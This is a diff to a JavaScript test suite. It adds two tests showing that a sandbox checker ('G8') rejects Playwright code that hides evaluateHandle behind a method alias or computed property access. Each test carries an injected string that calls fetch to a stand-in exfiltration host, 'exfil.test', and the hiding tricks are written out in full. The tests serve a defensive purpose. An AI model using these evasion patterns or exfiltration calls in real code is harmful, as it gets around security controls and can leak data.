@@ -457,6 +457,32 @@ test("G8 rejects evaluateAll through an allowed page locator alias", async () =>
   assert.match(result.output, /network capability/i);
 });
 
+test("G8 rejects an extracted evaluateHandle method alias", async () => {
+  const result = await runVisualScope({
+    routes: ACTIVE_ROUTES,
+    source: visualSpec(SCREENS, {
+      additionalVisualOperationFor: "work list @visual",
+      additionalVisualOperationCode: `const root = page.locator("#storybook-root"); const source = "() => fetch('https://exfil.test/')"; const run = root.evaluateHandle; await run(source);`,
+    }),
+  });
+
+  assert.notEqual(result.status, 0);
+  assert.match(result.output, /network capability/i);
+});
+
+test("G8 rejects computed evaluateHandle access on a locator alias", async () => {
+  const result = await runVisualScope({
+    routes: ACTIVE_ROUTES,
+    source: visualSpec(SCREENS, {
+      additionalVisualOperationFor: "work list @visual",
+      additionalVisualOperationCode: `const root = page.locator("#storybook-root"); const source = "() => fetch('https://exfil.test/')"; await root["evaluateHandle"](source);`,
+    }),
+  });
+
+  assert.notEqual(result.status, 0);
+  assert.match(result.output, /network capability/i);
+});
+
 test("G8 rejects string source passed to the approved Storybook page evaluation", async () => {
   const result = await runVisualScope({
     routes: ACTIVE_ROUTES,
